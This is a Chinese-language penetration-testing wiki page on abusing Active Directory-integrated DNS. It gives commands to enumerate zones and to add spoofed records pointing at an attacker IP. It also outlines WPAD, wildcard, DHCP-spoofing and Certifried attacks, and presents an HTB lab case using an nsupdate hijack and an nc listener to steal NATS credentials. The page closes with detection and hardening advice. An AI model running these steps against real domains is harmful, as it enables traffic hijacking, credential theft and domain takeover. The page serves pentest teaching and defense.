# AD DNS 记录

{{#include ../../banners/hacktricks-training.md}}

默认情况下，Active Directory 中的**任何用户**都可以**枚举**域或林 DNS 区域中的所有 DNS 记录，效果类似于区域传送（用户可以列出 AD 环境中 DNS 区域的子对象）。

工具 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) 可用于**枚举**并**导出**区域中的**所有 DNS 记录**，以便对内部网络进行信息收集。<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0（2025 年 4 月）新增 JSON/Greppable（`--json`）输出、多线程 DNS 解析，以及绑定到 LDAPS 时对 TLS 1.2/1.3 的支持  

更多信息请参阅 [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## 创建 / 修改记录（ADIDNS spoofing）

由于 **Authenticated Users** 组默认对区域 DACL 拥有 **Create Child** 权限，任何域账户（或计算机账户）都可以注册其他记录。这可用于流量劫持、强制 NTLM relay，甚至完全控制域。

### PowerMad / Invoke-DNSUpdate（PowerShell）

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py 随 Impacket ≥0.12.0 一同提供)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## 常见攻击原语

1. **Wildcard record** – `*.<zone>` 会将 AD DNS 服务器变成类似 LLMNR/NBNS spoofing 的全企业范围响应器。攻击者可利用它捕获 NTLM hashes，或将其 relay 到 LDAP/SMB。（需要禁用 WINS-lookup。）<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – 添加 `wpad`（或添加指向攻击者主机的 **NS** record，以绕过 Global-Query-Block-List），并透明代理出站 HTTP 请求以窃取凭据。Microsoft 已修补 wildcard/DNAME 绕过漏洞（CVE-2018-8320），但 **NS-records 仍然有效**。<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – 占用先前属于某台工作站的 IP 地址；关联的 DNS entry 仍会解析，因此无需接触 DNS 即可发动 resource-based constrained delegation 或 Shadow-Credentials 攻击。    
4. **DHCP → DNS spoofing** – 在默认的 Windows DHCP+DNS 部署中，同一子网内未经身份验证的攻击者可发送伪造 DHCP 请求，触发动态 DNS 更新并覆盖任何现有 A record（包括域控制器的记录）（Akamai “DDSpoof”，2023）。这会让攻击者能够对 Kerberos/LDAP 实施 machine-in-the-middle 攻击，并可能导致完全接管域。<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – 修改你控制的机器账户的 `dNSHostName`，注册匹配的 A record，然后为该名称申请证书以冒充 DC。**Certipy** 或 **BloodyAD** 等工具可全自动完成此流程。  

带有[序列化目标信息](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073)的 AD DNS record 可构成 conditional relay chain 的一环：调用方需要拥有创建 record 的权限、具备能迫使目标计算机向该名称进行身份验证的 coercion 路径，以及一个能够接受所得身份验证的 relay 目标。应单独评估目标协议；入站连接上的 SMB signing 本身并不能确定 HTTPS WinRM 目标是否接受 relay。补丁级别、名称处理方式、Extended Protection 和服务配置都可能影响结果。

---

### 利用过期动态记录劫持内部服务（NATS 案例研究）

如果动态更新对所有经过身份验证的用户开放，**已注销的服务名称就可以被重新注册并指向攻击者的基础设施**。Mirage HTB DC 在 DNS scavenging 后暴露了主机名 `nats-svc.mirage.htb`，因此任何低权限用户都可以：<sup>[[3]](#references)</sup>

1. **确认记录缺失**，并使用 `dig` 获取 SOA：

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **重新创建该记录**，指向他们控制的外部/VPN 接口：

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **冒充明文服务**。NATS 客户端在发送凭据前会期待看到一个 `INFO { ... }` banner，因此从真实 broker 复制一个合法的 banner 就足以窃取机密：

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

任何解析到被劫持名称的客户端都会立即向 listener leak 其 JSON `CONNECT` 帧（包括 `"user"`/`"pass"`）。在攻击者主机上运行官方 `nats-server -V` 二进制文件、关闭其日志脱敏功能，或直接使用 Wireshark 嗅探会话，都能获取相同的明文凭据，因为 TLS 是可选的。

4. **Pivot with the captured creds** – 在 Mirage 中，窃取的 NATS 账户提供了 JetStream 访问权限，从而暴露了包含可重复使用的 AD 用户名/密码的历史身份验证事件。

这种模式适用于所有依赖未加密 TCP 握手的 AD 集成服务（HTTP API、RPC、MQTT 等）：DNS 记录一旦被劫持，攻击者就成为了该服务。

---

## 检测与加固

* 禁止 **Authenticated Users** 在敏感区域拥有 *Create all child objects* 权限，并将动态更新委派给 DHCP 使用的专用账户。
* 如果必须进行动态更新，请将区域设为 **Secure-only**，并在 DHCP 中启用 **Name Protection**，这样只有所有者计算机对象才能覆盖自己的记录。
* 监控 DNS Server 事件 ID 257/252（动态更新）、770（区域传送），以及对 `CN=MicrosoftDNS,DC=DomainDnsZones` 的 LDAP 写入。
* 使用有意设置的无害记录或 Global Query Block List 阻止危险名称（`wpad`、`isatap`、`*`）。
* 保持 DNS 服务器修补更新——例如，RCE 漏洞 CVE-2024-26224 和 CVE-2024-26231 的 **CVSS 评分为 9.8**，可远程攻击域控制器。

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
